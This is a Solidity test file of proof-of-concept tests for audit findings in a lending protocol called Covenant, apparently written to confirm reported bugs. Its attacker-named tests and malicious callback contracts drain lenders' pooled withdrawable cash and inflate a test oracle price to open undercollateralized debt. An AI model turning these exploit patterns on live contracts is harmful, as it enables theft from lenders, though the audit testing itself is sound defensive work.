// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity ^0.8.0;

import {Covenant} from "../src/Covenant.sol";
import {ICovenant, Market, Offer, CollateralParams} from "../src/interfaces/ICovenant.sol";
import {IBuyCallback, ISellCallback} from "../src/interfaces/ICallbacks.sol";
import {Oracle} from "./helpers/Oracle.sol";
import {WAD, CALLBACK_SUCCESS, ORACLE_PRICE_SCALE} from "../src/libraries/ConstantsLib.sol";
import {TickLib, MAX_TICK} from "../src/libraries/TickLib.sol";
import {UtilsLib} from "../src/libraries/UtilsLib.sol";
import {Oracle} from "./helpers/Oracle.sol";
import {RevertingOracle} from "./helpers/RevertingOracle.sol";
import {ERC20} from "./erc20s/ERC20.sol";
import {BaseTest, MAX_TEST_AMOUNT} from "./BaseTest.sol";

/// @dev PoCs for audit-tracker findings (NM-042, NM-055, NM-061).
contract AuditPoCTest is BaseTest {
    using UtilsLib for uint256;

    Market internal market;
    bytes32 internal id;

    function setUp() public override {
        super.setUp();
        market.loanToken = address(loanToken);
        market.maturity = vm.getBlockTimestamp() + 100;
        market.collateralParams.push(
            CollateralParams({
                token: address(collateralToken1),
                lltv: 0.77e18,
                maxLif: maxLif(0.77e18, 0.25e18),
                oracle: address(oracle1)
            })
        );
        market.collateralParams = sortCollateralParams(market.collateralParams);
        market.rcfThreshold = 0;
        id = covenant.initMarket(market);
        covenant.setMarketTickSpacing(id, 1);
    }

    /// @dev NM-055: second activated collateral with reverting oracle bricks liquidation.
    function test_NM055_revertingOracleBlocksLiquidation() public {
        RevertingOracle revertingOracle = new RevertingOracle();
        revertingOracle.stopOracle();

        ERC20 token2 = new ERC20("", "");
        CollateralParams[] memory params = new CollateralParams[](2);
        params[0] = market.collateralParams[0];
        params[1] = CollateralParams({
            token: address(token2),
            lltv: 0.77e18,
            maxLif: maxLif(0.77e18, 0.25e18),
            oracle: address(revertingOracle)
        });
        Market memory dualMarket = market;
        dualMarket.collateralParams = sortCollateralParams(params);
        bytes32 dualId = covenant.initMarket(dualMarket);

        uint256 revertingIndex = bytes20(address(token2)) < bytes20(address(collateralToken1)) ? 0 : 1;
        uint256 goodIndex = revertingIndex == 0 ? 1 : 0;

        uint256 units = 1_000e18;
        collateralize(dualMarket, borrower, units, goodIndex);
        setupMarket(dualMarket, units);
        uint256 phantom = 1;
        deal(address(token2), borrower, phantom);
        vm.startPrank(borrower);
        ERC20(token2).approve(address(covenant), phantom);
        covenant.supplyCollateral(dualMarket, revertingIndex, phantom, borrower);
        vm.stopPrank();

        assertGt(covenant.debtOf(dualId, borrower), 0);

        vm.warp(dualMarket.maturity + 1);
        vm.expectRevert(bytes("Oracle should not be called"));
        covenant.seize(dualMarket, 0, 0, 0, borrower, true, address(this), address(0), "");
    }

    /// @dev NM-042: borrow at `t == maturity`, seize one second later in post-maturity mode.
    function test_NM042_takeAtMaturityThenPostMaturityLiquidate() public {
        uint256 units = 1_000e18;
        collateralize(market, borrower, units);

        vm.warp(market.maturity);
        Offer memory sellOffer = _setupMarketOffer(market, units);
        sellOffer.expiry = market.maturity;

        deal(address(loanToken), lender, units);
        vm.prank(lender);
        covenant.fillOffer(sellOffer, hex"", units, lender, borrower, address(0), hex"");

        assertEq(covenant.debtOf(id, borrower), units);
        assertTrue(covenant.isHealthy(market, id, borrower));

        vm.warp(market.maturity + 1);
        deal(address(loanToken), liquidator, units);
        vm.startPrank(liquidator);
        loanToken.approve(address(covenant), units);
        (uint256 seized, uint256 repaid) =
            covenant.seize(market, 0, 0, units, borrower, true, liquidator, address(0), "");
        vm.stopPrank();

        assertEq(repaid, units);
        assertGt(seized, 0);
        assertEq(covenant.debtOf(id, borrower), 0);
    }

    /// @dev NM-061: `onBuy` withdraw drains pooled withdrawable before payer tops up contract.
    function test_NM061_onBuyWithdrawDrainsIncumbentWithdrawable() public {
        uint256 units = 1_000e18;
        collateralize(market, borrower, units);
        setupMarket(market, units);

        vm.prank(borrower);
        covenant.repay(market, units, borrower, address(0), hex"");

        uint256 withdrawableBefore = covenant.withdrawable(id);
        assertEq(withdrawableBefore, units, "repay should fund withdrawable");
        assertEq(covenant.creditOf(id, lender), units, "incumbent lender credit");

        address attacker = makeAddr("attacker");
        WithdrawOnBuyCallback drain = new WithdrawOnBuyCallback(address(covenant));
        uint256 buyerPrice = TickLib.tickToPrice(MAX_TICK)
            + covenant.settlementFee(id, market.maturity - vm.getBlockTimestamp());
        uint256 buyerAssets = units.mulDivUp(buyerPrice, WAD);
        deal(address(loanToken), address(drain), buyerAssets);
        vm.prank(address(drain));
        loanToken.approve(address(covenant), buyerAssets);

        Offer memory sellOffer = _setupMarketOffer(market, units);
        sellOffer.expiry = vm.getBlockTimestamp() + 1 days;
        sellOffer.group = keccak256("nm061-second-fill");

        vm.prank(attacker);
        covenant.setIsAuthorized(address(drain), true, attacker);

        vm.prank(attacker);
        covenant.fillOffer(sellOffer, hex"", units, attacker, borrower, address(drain), hex"");

        assertEq(covenant.withdrawable(id), 0, "withdrawable drained");
        assertEq(covenant.creditOf(id, lender), units, "incumbent credit still outstanding");
        assertEq(loanToken.balanceOf(attacker), units, "attacker redeemed par from pool");
        assertEq(covenant.withdrawable(id) + covenant.creditOf(id, lender), units, "incumbent cannot access cash");
    }

    /// @dev NM-072 / Blackthorn L-15: repay funds shared withdrawable; new taker captures spread at par.
    function test_NM072_repayThenTakeWithdrawCapturesIncumbentCash() public {
        uint256 units = 1_000e18;
        for (uint256 i; i <= 6; i++) {
            covenant.setMarketSettlementFee(id, i, 0);
        }

        collateralize(market, borrower, units);
        setupMarket(market, units);

        assertEq(covenant.creditOf(id, lender), units, "incumbent credit");
        assertEq(covenant.withdrawable(id), 0, "pool empty before repay");

        vm.prank(borrower);
        covenant.repay(market, units, borrower, address(0), hex"");

        assertEq(covenant.withdrawable(id), units, "repay funded pool");
        assertEq(covenant.debtOf(id, borrower), 0, "borrower flat");

        address arb = makeAddr("spreadArb");
        collateralize(market, otherBorrower, units);

        Offer memory sellOffer;
        sellOffer.market = market;
        sellOffer.buy = false;
        sellOffer.maker = otherBorrower;
        sellOffer.receiverIfMakerIsSeller = otherBorrower;
        sellOffer.maxUnits = units;
        sellOffer.notary = address(dummyNotary);
        sellOffer.start = vm.getBlockTimestamp();
        sellOffer.expiry = vm.getBlockTimestamp() + 1 days;
        sellOffer.tick = MAX_TICK - 400;
        sellOffer.group = keccak256("nm072-second-borrow");

        uint256 offerPrice = TickLib.tickToPrice(sellOffer.tick);
        uint256 buyerAssets = units.mulDivUp(offerPrice, WAD);
        assertLt(buyerAssets, units, "discounted buy");

        deal(address(loanToken), arb, buyerAssets);
        vm.startPrank(arb);
        loanToken.approve(address(covenant), buyerAssets);
        covenant.fillOffer(sellOffer, hex"", units, arb, arb, address(0), hex"");
        covenant.withdraw(market, units, arb, arb);
        vm.stopPrank();

        assertEq(covenant.withdrawable(id), 0, "incumbent pool drained");
        assertEq(covenant.creditOf(id, lender), units, "incumbent still has par credit");
        assertEq(loanToken.balanceOf(arb), units, "arb withdrew at par");
        assertGt(units - buyerAssets, 0, "arb captured spread");
        assertLt(loanToken.balanceOf(lender), units, "incumbent did not get repaid cash");
    }

    /// @dev Design demo: post-callback `isHealthy` reads live oracle (see Audits.md M-03 — intentional, not a Medium).
    function test_M03_onSellOracleInflationBypassesSellerHealth() public {
        uint256 units = 1_000e18;
        uint256 half = units / 2;
        collateralize(market, borrower, half);

        Offer memory buyOffer = _setupMarketOffer(market, units);
        buyOffer.buy = true;
        buyOffer.maker = lender;
        buyOffer.receiverIfMakerIsSeller = address(0);
        buyOffer.group = keccak256("m03-buy-offer");

        uint256 buyerPrice = TickLib.tickToPrice(buyOffer.tick)
            + covenant.settlementFee(id, market.maturity - vm.getBlockTimestamp());
        uint256 buyerAssets = units.mulDivUp(buyerPrice, WAD);
        deal(address(loanToken), lender, buyerAssets);

        InflateOracleOnSellCallback inflate = new InflateOracleOnSellCallback(3);

        vm.expectRevert(ICovenant.SellerIsLiquidatable.selector);
        vm.prank(borrower);
        covenant.fillOffer(buyOffer, hex"", units, borrower, borrower, address(0), hex"");

        vm.prank(borrower);
        covenant.fillOffer(buyOffer, hex"", units, borrower, borrower, address(inflate), hex"");

        oracle1.setPrice(ORACLE_PRICE_SCALE);

        assertEq(covenant.debtOf(id, borrower), units, "debt opened at full size");
        assertFalse(covenant.isHealthy(market, id, borrower), "honest oracle shows undercollateralized");
        assertGt(loanToken.balanceOf(borrower), 0, "seller received loan tokens");
    }

    /// @dev NM-062: tick=0 sell + withdraw drains incumbent withdrawable.
    function test_NM062_tickZeroSellDrainsWithdrawable() public {
        uint256 units = 1_000e18;
        collateralize(market, borrower, units);
        setupMarket(market, units);

        vm.prank(borrower);
        covenant.repay(market, units, borrower, address(0), hex"");

        assertEq(covenant.withdrawable(id), units);
        assertEq(covenant.creditOf(id, lender), units);

        address attackerMaker = makeAddr("attackerMaker");
        address attackerTaker = makeAddr("attackerTaker");
        vm.prank(attackerMaker);
        covenant.setIsAuthorized(address(dummyNotary), true, attackerMaker);

        collateralize(market, attackerMaker, units);
        Offer memory tickZeroSell = _setupMarketOffer(market, units);
        tickZeroSell.maker = attackerMaker;
        tickZeroSell.receiverIfMakerIsSeller = attackerMaker;
        tickZeroSell.tick = 0;
        tickZeroSell.group = keccak256("tick0-drain");

        uint256 fee = covenant.settlementFee(id, market.maturity - vm.getBlockTimestamp());
        uint256 buyerAssets = units.mulDivUp(fee, WAD);
        deal(address(loanToken), attackerTaker, buyerAssets);

        vm.prank(attackerTaker);
        covenant.fillOffer(tickZeroSell, hex"", units, attackerTaker, attackerMaker, address(0), hex"");

        vm.prank(attackerTaker);
        covenant.withdraw(market, units, attackerTaker, attackerTaker);

        assertEq(covenant.withdrawable(id), 0);
        assertEq(covenant.creditOf(id, lender), units);
        assertEq(loanToken.balanceOf(attackerTaker), units);
        assertLt(buyerAssets, units / 100);
    }
}

contract InflateOracleOnSellCallback is ISellCallback {
    uint256 internal immutable multiplier;

    constructor(uint256 multiplier_) {
        multiplier = multiplier_;
    }

    function onSell(bytes32, Market memory market, uint256, uint256, uint256, address, address, bytes memory)
        external
        returns (bytes32)
    {
        Oracle oracle = Oracle(market.collateralParams[0].oracle);
        oracle.setPrice(oracle.price() * multiplier);
        return CALLBACK_SUCCESS;
    }
}

contract WithdrawOnBuyCallback is IBuyCallback {
    Covenant internal immutable COVENANT;

    constructor(address covenant_) {
        COVENANT = Covenant(covenant_);
    }

    function onBuy(
        bytes32 id,
        Market memory market,
        uint256,
        uint256 units,
        uint256,
        address buyer,
        bytes memory
    ) external returns (bytes32) {
        require(msg.sender == address(COVENANT));
        COVENANT.withdraw(market, units, buyer, buyer);
        return CALLBACK_SUCCESS;
    }
}
